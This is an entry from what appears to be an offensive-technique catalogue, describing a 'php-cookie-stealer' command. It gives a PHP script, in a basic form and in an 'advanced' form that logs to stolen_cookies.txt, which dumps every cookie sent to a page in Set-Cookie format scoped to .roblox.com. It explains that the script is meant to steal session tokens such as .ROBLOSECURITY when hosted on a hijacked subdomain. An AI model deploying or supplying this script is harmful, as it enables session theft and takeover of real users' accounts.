---
id: cmd-php-cookie-stealer
name: php-cookie-stealer
type: command
executor: php
data: >-
  <?php echo"Cookies received: <br>"; foreach($_COOKIE as $key=>$val) {
  echo"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
output: >-
  HTML output listing all cookies in Set-Cookie format for potential
  exfiltration
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.308Z'
platforms:
  - Web
tags:
  - cookie-theft
  - php
verified: false
validated: true
submitted: true
---

# php-cookie-stealer

## Command

```php
<?php echo"Cookies received: <br>"; foreach($_COOKIE as $key=>$val) { echo"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

## Description

This PHP script iterates over all incoming cookies using the $_COOKIE superglobal and echoes them in a Set-Cookie header format, facilitating theft and exfiltration of session tokens like .ROBLOSECURITY when hosted on a malicious subdomain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COOKIE | Superglobal array containing all cookies sent in the HTTP request | Yes (automatic) |

## Examples

### Basic Usage

```php
<?php echo"Cookies received: <br>"; foreach($_COOKIE as $key=>$val) { echo"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

Save as index.php and host on the subdomain; visit while authenticated.

### Advanced Usage

Add logging for exfiltration:

```php
<?php echo"Cookies received: <br>"; foreach($_COOKIE as $key=>$val) { echo"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; file_put_contents('stolen_cookies.txt', "$key=$val\n", FILE_APPEND); } ?>
```

## Expected Output

Browser displays: Cookies received: <br>Set-Cookie: .ROBLOSECURITY=abc123; Domain=.roblox.com; path=/<br>
(plus other cookies), allowing copy-paste or server-side logging.

## Related

- [[Related Procedure: Claim-Subdomain-and-Host-Cookie-Stealing-Script]]
